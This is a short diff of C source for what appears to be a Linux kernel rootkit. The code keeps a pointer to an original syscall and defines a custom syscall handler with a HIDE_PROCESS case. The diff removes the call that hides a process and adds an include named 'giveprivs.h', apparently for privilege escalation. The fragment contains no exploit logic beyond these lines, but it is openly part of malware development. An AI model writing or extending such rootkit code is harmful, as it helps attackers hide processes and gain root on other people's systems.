@@ -24,7 +24,8 @@
 #include "interrupt.h"
 #include "funcs.h"
 #include "types.h"
-#include "yarrops.h"
+
+#include "giveprivs.h"
 
 unsigned long *old_syscall = NULL;
 
@@ -47,7 +48,6 @@ asmlinkage long yarrSyscall(yarrOps code, const syscallData __user *data) {
 			break;
 
 		case HIDE_PROCESS:
-			res = hideProcess(data->pid);
 			break;
 
 		default:
